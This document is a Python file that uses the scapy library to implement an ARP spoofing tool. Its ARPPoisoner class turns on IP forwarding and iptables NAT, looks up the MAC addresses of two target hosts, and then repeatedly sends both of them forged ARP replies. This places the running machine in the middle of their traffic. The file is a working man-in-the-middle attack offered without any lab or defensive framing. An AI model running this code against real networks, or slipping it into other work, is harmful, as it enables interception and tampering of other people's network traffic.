import time
import sys
import logging
import os
from scapy.all import *

class ARPPoisoner:

    def enable_ip_forwarding(self, interface: str) -> None:
        logging.info("IP forwarding started")
        try:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except:
            logging.warning("Could not write to /proc/... trying iptables only.")
            
        os.system(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE")
        os.system(f"iptables -A FORWARD -i {interface} -j ACCEPT")

        logging.info("IP forwarding enabled")

    def get_MAC_address(self, ip: str, interface: str) -> str:
        logging.info(f"Retrieving MAC of device with IP {ip} started")
        # srp is a Layer 2 send/receive 
        pkt, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, verbose=False, iface=interface)

        if not pkt:
            exc = Exception(f"Device with IP {ip} not found")
            logging.critical(exc)
            raise exc

        logging.info(f"MAC of device with IP {ip} retrieved")
        return pkt[0][1].hwsrc

    def spoof(self, target_ip: str, spoof_ip: str, target_mac: str, interface: str) -> None:
        # [fixed] Ether hearder added, use sendp()
        # dst: destinatino MAC 
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        
  
        sendp(packet, verbose=False, iface=interface)

    def run(self, ip1: str, ip2: str, interface: str) -> None:
        logging.info("ARP poisoning started")

        self.enable_ip_forwarding(interface)
        
        try:
            mac1 = self.get_MAC_address(ip1, interface)
            mac2 = self.get_MAC_address(ip2, interface)
        except Exception as e:
            logging.error(e)
            return

        try:
            while True:
                self.spoof(ip1, ip2, mac1, interface)
                self.spoof(ip2, ip1, mac2, interface)
                time.sleep(2)
        except KeyboardInterrupt:
            logging.info("ARP poisoning interrupted")
            pass

        logging.info("ARP poisoning finished")